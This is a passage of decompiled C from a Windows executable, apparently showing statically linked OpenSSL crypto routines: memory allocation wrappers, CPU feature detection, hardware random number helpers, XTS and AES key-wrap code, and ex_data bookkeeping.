void *__cdecl sub_4133F0(size_t Size)
{
  if ( off_531284 && off_531284 != sub_4133F0 )
    return (void *)off_531284(Size);
  if ( !Size )
    return 0;
  dword_531280 = 0;
  return malloc(Size);
}
// 531280: using guessed type int dword_531280;
// 531284: using guessed type int (__cdecl *off_531284)(size_t Size);

//----- (00413430) --------------------------------------------------------
void *__cdecl sub_413430(size_t Size)
{
  size_t v1; // edi
  void *v2; // eax
  void *v4; // esi

  if ( !off_531284 || (char *)off_531284 == (char *)sub_4133F0 )
  {
    v1 = Size;
    if ( !Size )
      return 0;
    dword_531280 = 0;
    v2 = malloc(Size);
  }
  else
  {
    v1 = Size;
    v2 = (void *)off_531284(Size);
  }
  v4 = v2;
  if ( v2 )
    memset(v2, 0, v1);
  return v4;
}
// 531280: using guessed type int dword_531280;
// 531284: using guessed type int (__cdecl *off_531284)(size_t Size);

//----- (00413490) --------------------------------------------------------
void __cdecl sub_413490(void *Block)
{
  if ( !off_53128C || off_53128C == sub_413490 )
    free(Block);
  else
    off_53128C(Block);
}
// 53128C: using guessed type int (__cdecl *off_53128C)(void *Block);

//----- (004134B0) --------------------------------------------------------
void __cdecl sub_4134B0(_BYTE *Block, int a2)
{
  if ( Block )
  {
    if ( a2 )
      sub_4139E0(Block, a2);
    if ( !off_53128C || (char *)off_53128C == (char *)sub_413490 )
      free(Block);
    else
      off_53128C(Block);
  }
}
// 53128C: using guessed type int (__cdecl *off_53128C)(void *Block);

//----- (00413500) --------------------------------------------------------
void *__cdecl sub_413500(void *Block, size_t Size, int a3, int a4)
{
  void *result; // eax

  result = 0;
  if ( off_531288 && off_531288 != sub_413500 )
    return (void *)off_531288(Block, Size, a3, a4);
  if ( Block )
  {
    if ( Size )
    {
      dword_531280 = 0;
      return realloc(Block, Size);
    }
    else if ( !off_53128C || (char *)off_53128C == (char *)sub_413490 )
    {
      free(Block);
      return 0;
    }
    else
    {
      off_53128C(Block);
      return 0;
    }
  }
  else if ( !off_531284 || (char *)off_531284 == (char *)sub_4133F0 )
  {
    if ( Size )
    {
      dword_531280 = 0;
      return malloc(Size);
    }
  }
  else
  {
    return (void *)off_531284(Size);
  }
  return result;
}
// 531280: using guessed type int dword_531280;
// 531284: using guessed type int (__cdecl *off_531284)(size_t Size);
// 531288: using guessed type int (__cdecl *off_531288)(void *Block, size_t Size, int, int);
// 53128C: using guessed type int (__cdecl *off_53128C)(void *Block);

//----- (004135B0) --------------------------------------------------------
_BYTE *__cdecl sub_4135B0(_BYTE *Src, size_t a2, size_t Size)
{
  void *v4; // eax
  void *v5; // edi

  if ( !Src )
  {
    if ( off_531284 && (char *)off_531284 != (char *)sub_4133F0 )
      return (_BYTE *)off_531284(Size);
    if ( Size )
    {
      dword_531280 = 0;
      return malloc(Size);
    }
    return 0;
  }
  if ( !Size )
  {
    sub_4134B0(Src, a2);
    return 0;
  }
  if ( Size >= a2 )
  {
    v4 = sub_4133F0(Size);
    v5 = v4;
    if ( v4 )
    {
      memcpy(v4, Src, a2);
      sub_4134B0(Src, a2);
    }
    return v5;
  }
  else
  {
    sub_4139E0(&Src[Size], a2 - Size);
    return Src;
  }
}
// 531280: using guessed type int dword_531280;
// 531284: using guessed type int (__cdecl *off_531284)(size_t Size);

//----- (00413680) --------------------------------------------------------
unsigned int __cdecl sub_413680(int a1)
{
  unsigned int v1; // kr00_4
  unsigned int v2; // kr04_4
  unsigned int result; // eax
  unsigned int v8; // edi
  BOOL v9; // eax
  int v10; // ebp
  BOOL v11; // esi
  int v12; // esi
  unsigned int v18; // esi
  unsigned int v29; // esi
  bool v40; // cf
  int v41; // edi
  unsigned int v50; // esi
  int v51; // eax

  v1 = __readeflags();
  __writeeflags(v1 ^ 0x200000);
  v2 = __readeflags();
  result = 0;
  if ( ((v2 ^ v1) & 0x200000) != 0 )
  {
    *(_DWORD *)(a1 + 8) = 0;
    __asm { cpuid }
    v8 = _EAX;
    v9 = _ECX != 1818588270;
    v10 = v9 || _EDX != 1231384169 || _EBX != 1970169159;
    if ( !v10 )
      goto LABEL_9;
    LOBYTE(v9) = _EBX != 1752462657;
    v11 = v9;
    LOBYTE(v9) = _EDX != 1769238117;
    v12 = v9 || v11;
    LOBYTE(v9) = _ECX != 1145913699;
    if ( v9 | v12 )
      goto LABEL_9;
    _EAX = 0x80000000;
    __asm { cpuid }
    if ( _EAX < 0x80000001 )
      goto LABEL_9;
    v18 = _EAX;
    _EAX = -2147483647;
    __asm { cpuid }
    v10 = ((unsigned __int16)_ECX | (unsigned __int16)v10) & 0x801;
    if ( v18 < 0x80000008 )
    {
LABEL_9:
      if ( v8 >= 7 )
      {
        _EAX = 7;
        __asm { cpuid }
        *(_DWORD *)(a1 + 8) = _EBX;
      }
      v40 = v8 < 4;
      v41 = -1;
      if ( !v40 )
      {
        _EAX = 4;
        __asm { cpuid }
        v41 = (_EAX >> 14) & 0xFFF;
      }
      _EAX = 1;
      __asm { cpuid }
      _EDX = _EDX & 0xBFEFFFFF;
      if ( !v10 )
      {
        _EDX |= 0x40000000u;
        if ( (BYTE1(_EAX) & 0xF) == 15 )
          _EDX |= 0x100000u;
      }
      if ( (_EDX & 0x10000000) != 0 )
      {
        _EDX &= ~0x10000000u;
        if ( v41 )
        {
          _EDX |= 0x10000000u;
          if ( BYTE2(_EBX) <= 1u )
            _EDX &= ~0x10000000u;
        }
      }
    }
    else
    {
      _EAX = -2147483640;
      __asm { cpuid }
      v29 = (unsigned __int8)_ECX + 1;
      _EAX = 1;
      __asm { cpuid }
      if ( (_EDX & 0x10000000) != 0 && BYTE2(_EBX) <= v29 )
        _EDX &= ~0x10000000u;
    }
    v50 = _EDX;
    if ( (_ECX & 0x8000000) != 0 )
    {
      __asm { xgetbv }
      v51 = _EAX & 6;
      if ( v51 == 6 )
        return v50;
      if ( v51 != 2 )
        v50 = _EDX & 0xFEFFFFFF;
    }
    *(_DWORD *)(a1 + 8) &= ~0x20u;
    return v50;
  }
  return result;
}

//----- (004139E0) --------------------------------------------------------
int __cdecl sub_4139E0(_BYTE *a1, unsigned int a2)
{
  unsigned int v3; // ecx
  int result; // eax

  v3 = a2;
  result = 0;
  if ( a2 < 7 )
  {
    if ( !a2 )
      return result;
    goto LABEL_3;
  }
  while ( ((unsigned __int8)a1 & 3) != 0 )
  {
    *a1 = 0;
    --v3;
    ++a1;
  }
  do
  {
    *(_DWORD *)a1 = 0;
    v3 -= 4;
    a1 += 4;
  }
  while ( (v3 & 0xFFFFFFFC) != 0 );
  while ( v3 )
  {
LABEL_3:
    *a1 = 0;
    --v3;
    ++a1;
  }
  return result;
}

//----- (00413A50) --------------------------------------------------------
int __cdecl sub_413A50(char *a1, _BYTE *a2, int a3)
{
  int v5; // ecx
  int result; // eax
  char v7; // dl
  char v8; // dl

  v5 = a3;
  result = 0;
  if ( a3 )
  {
    do
    {
      v7 = *a1++;
      v8 = *a2++ ^ v7;
      LOBYTE(result) = v8 | result;
      --v5;
    }
    while ( v5 );
    return result > 0;
  }
  return result;
}

//----- (00413B90) --------------------------------------------------------
int sub_413B90()
{
  int v0; // ecx
  int result; // eax

  v0 = 8;
  do
  {
    __asm { rdrand  eax }
    if ( _CF )
      break;
    --v0;
  }
  while ( v0 );
  if ( !result )
    return v0;
  return result;
}

//----- (00413BB0) --------------------------------------------------------
int __cdecl sub_413BB0(unsigned int *a1, unsigned int a2)
{
  int result; // eax
  unsigned int v4; // ebx
  int i; // ecx

  result = 0;
  v4 = a2;
  if ( a2 )
  {
    for ( i = 8; ; i = 8 )
    {
      while ( 1 )
      {
        __asm { rdrand  edx }
        if ( _CF )
          break;
        if ( !--i )
          return result;
      }
      if ( v4 < 4 )
        break;
      *a1++ = _EDX;
      result += 4;
      v4 -= 4;
      if ( !v4 )
        return result;
    }
    do
    {
      *(_BYTE *)a1 = _EDX;
      a1 = (unsigned int *)((char *)a1 + 1);
      ++result;
      _EDX >>= 8;
      --v4;
    }
    while ( v4 );
  }
  return result;
}

//----- (00413C50) --------------------------------------------------------
int __cdecl sub_413C50(unsigned int *a1, unsigned int a2)
{
  int result; // eax
  unsigned int v4; // ebx
  int i; // ecx

  result = 0;
  v4 = a2;
  if ( a2 )
  {
    for ( i = 8; ; i = 8 )
    {
      while ( 1 )
      {
        __asm { rdseed  edx }
        if ( _CF )
          break;
        if ( !--i )
          return result;
      }
      if ( v4 < 4 )
        break;
      *a1++ = _EDX;
      result += 4;
      v4 -= 4;
      if ( !v4 )
        return result;
    }
    do
    {
      *(_BYTE *)a1 = _EDX;
      a1 = (unsigned int *)((char *)a1 + 1);
      ++result;
      _EDX >>= 8;
      --v4;
    }
    while ( v4 );
  }
  return result;
}

//----- (00413CD0) --------------------------------------------------------
int __cdecl sub_413CD0(int *a1, int *a2, char *a3, char *a4, unsigned int a5, int a6)
{
  unsigned int v6; // ebx
  int v10; // eax
  int v11; // edx
  unsigned __int64 v12; // rax
  unsigned int v13; // ecx
  int v14; // ebp
  int v15; // ebx
  int v16; // ebp
  int v17; // ecx
  void (__cdecl *v18)(int *, int *, int); // edx
  int v19; // edx
  unsigned int v20; // ebx
  int v21; // ecx
  int v22; // eax
  int v23; // ecx
  unsigned int v24; // eax
  bool v25; // zf
  int v26; // ebx
  unsigned int v27; // esi
  int v28; // ecx
  int v29; // ebx
  int v30; // ecx
  int v31; // edx
  int v32; // esi
  int v33; // ebx
  int v34; // ebx
  int v35; // ebp
  int v36; // ecx
  int v37; // ecx
  int v38; // ecx
  int *v39; // ecx
  _BYTE *v40; // eax
  int v41; // esi
  unsigned int v42; // ebp
  char v43; // dl
  int v44; // ecx
  int v45; // edx
  int v46; // eax
  int v47; // [esp-8h] [ebp-60h]
  char v48; // [esp+Fh] [ebp-49h]
  unsigned int v49; // [esp+10h] [ebp-48h]
  int v50; // [esp+1Ch] [ebp-3Ch]
  int v51; // [esp+24h] [ebp-34h] BYREF
  int v52; // [esp+28h] [ebp-30h]
  __int64 v53; // [esp+2Ch] [ebp-2Ch]
  int v54; // [esp+34h] [ebp-24h] BYREF
  int v55; // [esp+38h] [ebp-20h]
  unsigned __int64 v56; // [esp+3Ch] [ebp-1Ch]
  int i; // [esp+44h] [ebp-14h]
  int v58; // [esp+48h] [ebp-10h]
  int v59; // [esp+50h] [ebp-8h]

  v6 = a5;
  if ( a5 < 0x10 )
    return -1;
  v54 = *a2;
  v55 = a2[1];
  v10 = a2[3];
  LODWORD(v56) = a2[2];
  v11 = a1[1];
  HIDWORD(v56) = v10;
  ((void (__cdecl *)(int *, int *, int))a1[3])(&v54, &v54, v11);
  if ( !a6 && (a5 & 0xF) != 0 )
  {
    v6 = a5 - 16;
    a5 -= 16;
  }
  v12 = v56;
  v13 = v55;
  v14 = v54;
  if ( v6 >= 0x10 )
  {
    do
    {
      v15 = v14 ^ *(_DWORD *)a3;
      v16 = v13 ^ *((_DWORD *)a3 + 1);
      v17 = v12 ^ *((_DWORD *)a3 + 2);
      HIDWORD(v53) = HIDWORD(v12) ^ *((_DWORD *)a3 + 3);
      LODWORD(v53) = v17;
      v47 = *a1;
      v18 = (void (__cdecl *)(int *, int *, int))a1[2];
      v51 = v15;
      v52 = v16;
      v18(&v51, &v51, v47);
      v19 = v54;
      v20 = v55;
      v21 = v55 ^ v52;
      v22 = v54 ^ v51;
      *((_DWORD *)a4 + 1) = v55 ^ v52;
      v52 = v21;
      v23 = HIDWORD(v56) ^ HIDWORD(v53);
      *(_DWORD *)a4 = v22;
      v51 = v22;
      v24 = v56;
      LODWORD(v53) = v56 ^ v53;
      *((_DWORD *)a4 + 2) = v53;
      *((_DWORD *)a4 + 3) = v23;
      a3 += 16;
      a4 += 16;
      v25 = a5 == 16;
      a5 -= 16;
      HIDWORD(v53) = v23;
      if ( v25 )
        return 0;
      v14 = (2 * v19) ^ (SHIDWORD(v56) >> 31) & 0x87;
      v13 = __PAIR64__(v20, v19) >> 31;
      v12 = 2 * __PAIR64__(HIDWORD(v56), v24);
      LODWORD(v12) = (v20 >> 31) | v12;
      v54 = v14;
      v55 = v13;
      v56 = v12;
    }
    while ( a5 >= 0x10 );
  }
  if ( !a6 )
  {
    v33 = (SHIDWORD(v12) >> 31) & 0x87;
    HIDWORD(v12) = __PAIR64__(v13, v14) >> 31;
    v34 = (2 * v14) ^ v33;
    v58 = 0;
    v35 = (2 * v12) | (v13 >> 31);
    v36 = v34 ^ *(_DWORD *)a3;
    v59 = __PAIR64__(HIDWORD(v56), v12) >> 31;
    LODWORD(v12) = HIDWORD(v12) ^ *((_DWORD *)a3 + 1);
    v51 = v36;
    v37 = *((_DWORD *)a3 + 2);
    v58 = HIDWORD(v12);
    HIDWORD(v12) = v59 ^ *((_DWORD *)a3 + 3);
    v52 = v12;
    LODWORD(v53) = v35 ^ v37;
    v38 = *a1;
    HIDWORD(v53) = HIDWORD(v12);
    ((void (__cdecl *)(int *, int *, int))a1[2])(&v51, &v51, v38);
    v51 ^= v34;
    v52 ^= v58;
    LODWORD(v53) = v35 ^ v53;
    HIDWORD(v53) ^= v59;
    if ( a5 )
    {
      v39 = &v51;
      v40 = a4 + 16;
      v41 = a3 - a4;
      v42 = a5;
      do
      {
        v43 = v40[v41];
        *v40 = *(_BYTE *)v39;
        *(_BYTE *)v39 = v43;
        ++v40;
        v39 = (int *)((char *)v39 + 1);
        --v42;
      }
      while ( v42 );
    }
    v51 ^= v54;
    v52 ^= v55;
    v53 ^= v56;
    ((void (__cdecl *)(int *, int *, _DWORD))a1[2])(&v51, &v51, *a1);
    v44 = v55 ^ v52;
    v45 = v56 ^ v53;
    *(_DWORD *)a4 = v54 ^ v51;
    v46 = HIDWORD(v56) ^ HIDWORD(v53);
    *((_DWORD *)a4 + 1) = v44;
    *((_DWORD *)a4 + 2) = v45;
    *((_DWORD *)a4 + 3) = v46;
    return 0;
  }
  v49 = 0;
  if ( a5 )
  {
    v50 = a3 - a4;
    v26 = a4 - (char *)&v51;
    for ( i = a4 - (char *)&v51; ; v26 = i )
    {
      v48 = *((_BYTE *)&v51 + v49 + v26 + v50);
      *((_BYTE *)&v51 + v49 + v26) = *((_BYTE *)&v51 + v49);
      v27 = v49++;
      *((_BYTE *)&v51 + v27) = v48;
      if ( v49 >= a5 )
        break;
    }
  }
  v53 ^= v12;
  v52 ^= v13;
  v28 = *a1;
  v51 ^= v14;
  ((void (__cdecl *)(int *, int *, int))a1[2])(&v51, &v51, v28);
  v29 = HIDWORD(v56);
  v30 = v55 ^ v52;
  v31 = v56 ^ v53;
  v32 = HIDWORD(v53);
  *((_DWORD *)a4 - 4) = v54 ^ v51;
  *((_DWORD *)a4 - 3) = v30;
  *((_DWORD *)a4 - 2) = v31;
  *((_DWORD *)a4 - 1) = v29 ^ v32;
  return 0;
}

//----- (00414080) --------------------------------------------------------
size_t __cdecl sub_414080(int a1, int *a2, _DWORD *a3, void *Src, size_t Size, void (__cdecl *a6)(int *, int *, int))
{
  _DWORD *v6; // edi
  unsigned int v7; // ebx
  int *v8; // eax
  int v9; // edx
  size_t v10; // eax
  int *v11; // esi
  size_t v12; // edi
  int v13; // ecx
  int v14; // edx
  int v15; // edx
  int v17; // [esp+8h] [ebp-20h]
  int v18; // [esp+14h] [ebp-14h] BYREF
  int v19; // [esp+18h] [ebp-10h]
  int v20; // [esp+1Ch] [ebp-Ch]
  int v21; // [esp+20h] [ebp-8h]

  v6 = a3;
  if ( (Size & 7) != 0 || Size - 16 > 0x7FFFFFF0 )
    return 0;
  v7 = 1;
  memcpy_0(a3 + 2, Src, Size);
  v8 = a2;
  if ( !a2 )
    v8 = (int *)&unk_4F1934;
  v9 = v8[1];
  v18 = *v8;
  v19 = v9;
  v17 = 6;
  do
  {
    v10 = Size;
    v11 = v6 + 2;
    if ( Size )
    {
      v12 = ((Size - 1) >> 3) + 1;
      do
      {
        v13 = v11[1];
        v20 = *v11;
        v21 = v13;
        a6(&v18, &v18, a1);
        HIBYTE(v19) ^= v7;
        if ( v7 > 0xFF )
        {
          BYTE2(v19) ^= BYTE1(v7);
          BYTE1(v19) ^= BYTE2(v7);
          LOBYTE(v19) = HIBYTE(v7) ^ v19;
        }
        v14 = v21;
        *v11 = v20;
        v11[1] = v14;
        ++v7;
        v11 += 2;
        --v12;
      }
      while ( v12 );
      v10 = Size;
      v6 = a3;
    }
    --v17;
  }
  while ( v17 );
  v15 = v19;
  *v6 = v18;
  v6[1] = v15;
  return v10 + 8;
}

//----- (004141C0) --------------------------------------------------------
int __fastcall sub_4141C0(int *a1, void (__cdecl *a2)(int *, int *, int), int a3, _DWORD *a4, char *a5, int a6)
{
  unsigned int v6; // ebx
  int result; // eax
  int *v8; // esi
  unsigned int v9; // edi
  int v10; // eax
  int v11; // ecx
  int v12; // [esp+Ch] [ebp-24h]
  int v14; // [esp+1Ch] [ebp-14h] BYREF
  int v15; // [esp+20h] [ebp-10h]
  int v16; // [esp+24h] [ebp-Ch]
  int v17; // [esp+28h] [ebp-8h]

  if ( (((_BYTE)a6 - 8) & 7) != 0 || (unsigned int)(a6 - 24) > 0x7FFFFFF0 )
    return 0;
  v14 = *a1;
  v6 = 6 * ((unsigned int)(a6 - 8) >> 3);
  v15 = a1[1];
  memcpy_0(a5, a1 + 2, a6 - 8);
  result = a6 - 8;
  v12 = 6;
  do
  {
    v8 = (int *)&a5[a6 - 16];
    if ( result )
    {
      v9 = ((unsigned int)(result - 1) >> 3) + 1;
      do
      {
        HIBYTE(v15) ^= v6;
        if ( v6 > 0xFF )
        {
          BYTE2(v15) ^= BYTE1(v6);
          BYTE1(v15) ^= BYTE2(v6);
          LOBYTE(v15) = HIBYTE(v6) ^ v15;
        }
        v10 = v8[1];
        v16 = *v8;
        v17 = v10;
        a2(&v14, &v14, a3);
        v11 = v17;
        *v8 = v16;
        v8[1] = v11;
        --v6;
        v8 -= 2;
        --v9;
      }
      while ( v9 );
      result = a6 - 8;
    }
    --v12;
  }
  while ( v12 );
  *a4 = v14;
  a4[1] = v15;
  return result;
}

//----- (00414300) --------------------------------------------------------
int __cdecl sub_414300(int a1, _BYTE *a2, char *a3, int *a4, int a5, void (__cdecl *a6)(int *, int *, int))
{
  _BYTE *v6; // ebx
  int v7; // esi
  char v9[8]; // [esp+Ch] [ebp-Ch] BYREF

  v6 = a2;
  v7 = sub_4141C0(a4, a6, a1, v9, a3, a5);
  if ( !v7 )
    return 0;
  if ( !a2 )
    v6 = &unk_4F1934;
  if ( sub_413A50(v9, v6, 8) )
  {
    sub_4139E0(a3, v7);
    return 0;
  }
  return v7;
}
// 414300: using guessed type char var_C[8];

//----- (004143A0) --------------------------------------------------------
size_t __cdecl sub_4143A0(int a1, int *a2, int *a3, void *Src, int Size, void (__cdecl *a6)(int *, int *, int))
{
  size_t v6; // edi
  size_t v7; // ebp
  int v8; // ecx
  int v10; // [esp+18h] [ebp-Ch] BYREF
  int v11; // [esp+1Ch] [ebp-8h]

  v6 = 8 * ((unsigned int)(Size + 7) >> 3);
  v7 = v6 - Size;
  if ( Size <= 0 )
    return 0;
  if ( a2 )
    v10 = *a2;
  else
    v10 = -1504093786;
  LOBYTE(v11) = HIBYTE(Size);
  BYTE1(v11) = BYTE2(Size);
  BYTE2(v11) = BYTE1(Size);
  HIBYTE(v11) = Size;
  if ( v6 == 8 )
  {
    memcpy_0(a3 + 2, Src, Size);
    v8 = v11;
    *a3 = v10;
    a3[1] = v8;
    memset((char *)a3 + Size + 8, 0, v7);
    a6(a3, a3, a1);
    return 16;
  }
  else
  {
    memcpy_0(a3, Src, Size);
    memset((char *)a3 + Size, 0, v7);
    return sub_414080(a1, &v10, a3, a3, v6, a6);
  }
}

//----- (004144E0) --------------------------------------------------------
unsigned int __cdecl sub_4144E0(
        int a1,
        _BYTE *a2,
        int *a3,
        void *Src,
        size_t Size,
        void (__cdecl *a6)(int *, int *, int))
{
  size_t v6; // ebp
  int v7; // ecx
  int v8; // eax
  unsigned int v9; // edi
  int v11; // [esp+10h] [ebp-18h]
  int v12; // [esp+1Ch] [ebp-Ch] BYREF
  int v13; // [esp+20h] [ebp-8h]

  v6 = (Size >> 3) - 1;
  if ( (Size & 7) != 0 || Size - 16 > 0x7FFFFFEF )
    return 0;
  memcpy_0(a3, Src, Size);
  if ( Size == 16 )
  {
    a6(a3, a3, a1);
    v7 = a3[1];
    v12 = *a3;
    v13 = v7;
    memcpy_0(a3, a3 + 2, 8u);
    v11 = 8;
    goto LABEL_6;
  }
  v11 = Size - 8;
  if ( Size - 8 == sub_4141C0(a3, a6, a1, &v12, (char *)a3, Size) )
  {
LABEL_6:
    if ( a2 )
      v8 = sub_413A50((char *)&v12, a2, 4);
    else
      v8 = sub_413A50((char *)&v12, &dword_4F193C, 4);
    if ( !v8 )
    {
      v9 = HIBYTE(v13) | ((BYTE2(v13) | ((BYTE1(v13) | ((unsigned __int8)v13 << 8)) << 8)) << 8);
      if ( 8 * v6 - 8 < v9 && v9 <= 8 * v6 && !sub_413A50((char *)a3 + v9, byte_5388E0, v11 - v9) )
        return v9;
    }
  }
  sub_4139E0(a3, Size);
  return 0;
}
// 4F193C: using guessed type int dword_4F193C;
// 5388E0: using guessed type _BYTE byte_5388E0[8];

//----- (00414650) --------------------------------------------------------
struct _RTL_CRITICAL_SECTION *sub_414650()
{
  struct _RTL_CRITICAL_SECTION *v0; // eax
  struct _RTL_CRITICAL_SECTION *v1; // esi

  v0 = (struct _RTL_CRITICAL_SECTION *)sub_413430(0x18u);
  v1 = v0;
  if ( !v0 )
    return 0;
  if ( !InitializeCriticalSectionAndSpinCount(v0, 0x400u) )
  {
    sub_413490(v1);
    return 0;
  }
  return v1;
}

//----- (00414690) --------------------------------------------------------
int __cdecl sub_414690(LPCRITICAL_SECTION lpCriticalSection)
{
  EnterCriticalSection(lpCriticalSection);
  return 1;
}

//----- (004146B0) --------------------------------------------------------
int __cdecl sub_4146B0(LPCRITICAL_SECTION lpCriticalSection)
{
  LeaveCriticalSection(lpCriticalSection);
  return 1;
}

//----- (004146D0) --------------------------------------------------------
void __cdecl sub_4146D0(LPCRITICAL_SECTION lpCriticalSection)
{
  if ( lpCriticalSection )
  {
    DeleteCriticalSection(lpCriticalSection);
    sub_413490(lpCriticalSection);
  }
}

//----- (00414700) --------------------------------------------------------
BOOL __cdecl sub_414700(volatile LONG *Destination, void (*a2)(void))
{
  LONG v3; // eax

  if ( *Destination == 2 )
    return 1;
  while ( 1 )
  {
    v3 = InterlockedCompareExchange(Destination, 1, 0);
    if ( !v3 )
      break;
    if ( v3 != 1 )
      return *Destination == 2;
  }
  a2();
  *Destination = 2;
  return 1;
}

//----- (00414750) --------------------------------------------------------
BOOL __cdecl sub_414750(DWORD *a1)
{
  DWORD v1; // eax

  v1 = TlsAlloc();
  *a1 = v1;
  return v1 != -1;
}

//----- (00414770) --------------------------------------------------------
LPVOID __cdecl sub_414770(DWORD *a1)
{
  return TlsGetValue(*a1);
}

//----- (00414780) --------------------------------------------------------
BOOL __cdecl sub_414780(DWORD *a1, LPVOID lpTlsValue)
{
  return TlsSetValue(*a1, lpTlsValue);
}

//----- (004147A0) --------------------------------------------------------
BOOL __cdecl sub_4147A0(DWORD *a1)
{
  return TlsFree(*a1);
}

//----- (004147D0) --------------------------------------------------------
BOOL __cdecl sub_4147D0(int a1, int a2)
{
  return a1 == a2;
}

//----- (004147E0) --------------------------------------------------------
int __cdecl sub_4147E0(volatile LONG *Addend, LONG Value, _DWORD *a3)
{
  *a3 = Value + InterlockedExchangeAdd(Addend, Value);
  return 1;
}

//----- (00414800) --------------------------------------------------------
void __cdecl sub_414800(void *Block)
{
  sub_413490(Block);
}

//----- (00414820) --------------------------------------------------------
void sub_414820()
{
  void **v0; // esi

  v0 = (void **)&unk_5388E8;
  do
  {
    sub_426C00(*v0, (void (__cdecl *)(_DWORD))sub_414800);
    *v0++ = 0;
  }
  while ( (int)v0 < (int)&dword_538920 );
  sub_4146D0(dword_538920);
  dword_538920 = 0;
}

//----- (00414870) --------------------------------------------------------
int __cdecl sub_414870(int *a1, int a2, int a3)
{
  _DWORD *v3; // eax
  int v5; // esi

  if ( *a1 || (v3 = sub_426AF0(), (*a1 = (int)v3) != 0) )
  {
    v5 = sub_426A30(*a1);
    if ( v5 > a2 )
    {
LABEL_7:
      sub_426A60((int *)*a1, a2, a3);
      return 1;
    }
    else
    {
      while ( sub_4269B0((int *)*a1, 0) )
      {
        if ( ++v5 > a2 )
          goto LABEL_7;
      }
      sub_408310(15, 102, 65, (int)"crypto\\ex_data.c", 362);
      return 0;
    }
  }
  else
  {
    sub_408310(15, 102, 65, (int)"crypto\\ex_data.c", 355);
    return 0;
  }
}

//----- (00414960) --------------------------------------------------------
char *__usercall sub_414960@<eax>(unsigned int a1@<esi>)
{
  if ( a1 > 0xD )
  {
    sub_408310(15, 113, 7, "crypto\\ex_data.c", 54);
  }
  else
  {
    if ( (sub_414700(&dword_538924, (void (*)(void))sub_414940) ? dword_538928 : 0) == 0 )
    {
      sub_408310(15, 113, 65, "crypto\\ex_data.c", 59);
      return 0;
    }
    if ( dword_538920 )
    {
      sub_414690(dword_538920);
      return (char *)&unk_5388E8 + 4 * a1;
    }
  }
  return 0;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 414940: using guessed type int sub_414940();
// 538928: using guessed type int dword_538928;

//----- (004149D0) --------------------------------------------------------
int __cdecl sub_4149D0(unsigned int a1, int a2, int a3, int a4, int a5, int a6)
{
  char *v6; // eax
  int *v7; // edi
  int *v9; // eax
  _DWORD *v10; // eax
  void *v11; // esi
  int v12; // ebx

  v6 = sub_414960(a1);
  v7 = (int *)v6;
  if ( !v6 )
    return -1;
  if ( !*(_DWORD *)v6 )
  {
    v9 = sub_426AF0();
    *v7 = (int)v9;
    if ( !v9 || !sub_4269B0(v9, 0) )
    {
      sub_408310(15, 100, 65, (int)"crypto\\ex_data.c", 171);
LABEL_7:
      sub_4146B0(dword_538920);
      return -1;
    }
  }
  v10 = sub_4133F0(0x14u);
  v11 = v10;
  if ( !v10 )
  {
    sub_408310(15, 100, 65, (int)"crypto\\ex_data.c", 178);
    goto LABEL_7;
  }
  *v10 = a2;
  v10[1] = a3;
  v10[2] = a4;
  v10[4] = a5;
  v10[3] = a6;
  if ( sub_4269B0((int *)*v7, 0) )
  {
    v12 = sub_426A30(*v7) - 1;
    sub_426A60((int *)*v7, v12, (int)v11);
    sub_4146B0(dword_538920);
    return v12;
  }
  else
  {
    sub_408310(15, 100, 65, (int)"crypto\\ex_data.c", 188);
    sub_413490(v11);
    sub_4146B0(dword_538920);
    return -1;
  }
}

//----- (00414B00) --------------------------------------------------------
char *__cdecl sub_414B00(unsigned int a1, int a2, int **a3)
{
  char *v3; // edi
  char *result; // eax
  int **v5; // ebx
  int v6; // eax
  int v7; // ebp
  int i; // esi
  int j; // esi
  int v10; // eax
  int v11; // eax
  char v12[40]; // [esp+Ch] [ebp-28h] BYREF

  v3 = 0;
  result = sub_414960(a1);
  v5 = (int **)result;
  if ( !result )
    return result;
  *a3 = 0;
  v6 = sub_426A30(*(_DWORD *)result);
  v7 = v6;
  if ( v6 > 0 )
  {
    if ( v6 < 10 )
    {
      v3 = v12;
      goto LABEL_6;
    }
    v3 = (char *)sub_4133F0(4 * v6);
    if ( v3 )
    {
LABEL_6:
      for ( i = 0; i < v7; ++i )
        *(_DWORD *)&v3[4 * i] = sub_426A40(*v5, i);
    }
  }
  sub_4146B0(dword_538920);
  if ( v7 <= 0 || v3 )
  {
    for ( j = 0; j < v7; ++j )
    {
      v10 = *(_DWORD *)&v3[4 * j];
      if ( v10 && *(_DWORD *)(v10 + 8) )
      {
        if ( *a3 && j < sub_426A30((int)*a3) )
          v11 = sub_426A40(*a3, j);
        else
          v11 = 0;
        (*(void (__cdecl **)(int, int, int **, int, _DWORD, _DWORD))(*(_DWORD *)&v3[4 * j] + 8))(
          a2,
          v11,
          a3,
          j,
          **(_DWORD **)&v3[4 * j],
          *(_DWORD *)(*(_DWORD *)&v3[4 * j] + 4));
      }
    }
    if ( v3 != v12 )
      sub_413490(v3);
    return (char *)1;
  }
  else
  {
    sub_408310(15, 112, 65, (int)"crypto\\ex_data.c", 233);
    return 0;
  }
}

//----- (00414C40) --------------------------------------------------------
int __cdecl sub_414C40(unsigned int a1, int *a2, int *a3)
{
  char *v3; // ebx
  int result; // eax
  int **v5; // ebp
  int v6; // edi
  int v7; // eax
  int i; // esi
  int j; // esi
  int v10; // eax
  int v11; // eax
  int v12; // [esp+4h] [ebp-2Ch] BYREF
  char v13[40]; // [esp+8h] [ebp-28h] BYREF

  v3 = 0;
  if ( !*a3 )
    return 1;
  result = (int)sub_414960(a1);
  v5 = (int **)result;
  if ( result )
  {
    v6 = sub_426A30(*(_DWORD *)result);
    v7 = sub_426A30(*a3);
    if ( v7 < v6 )
      v6 = v7;
    if ( v6 <= 0 )
      goto LABEL_12;
    if ( v6 >= 10 )
    {
      v3 = (char *)sub_4133F0(4 * v6);
      if ( !v3 )
        goto LABEL_12;
    }
    else
    {
      v3 = v13;
    }
    for ( i = 0; i < v6; ++i )
      *(_DWORD *)&v3[4 * i] = sub_426A40(*v5, i);
LABEL_12:
    sub_4146B0(dword_538920);
    if ( v6 <= 0 || v3 )
    {
      for ( j = 0; j < v6; ++j )
      {
        if ( *a3 && j < sub_426A30(*a3) )
          v10 = sub_426A40((int *)*a3, j);
        else
          v10 = 0;
        v12 = v10;
        v11 = *(_DWORD *)&v3[4 * j];
        if ( v11 && *(_DWORD *)(v11 + 16) )
          (*(void (__cdecl **)(int *, int *, int *, int, _DWORD, _DWORD))(v11 + 16))(
            a2,
            a3,
            &v12,
            j,
            *(_DWORD *)v11,
            *(_DWORD *)(v11 + 4));
        sub_414870(a2, j, v12);
      }
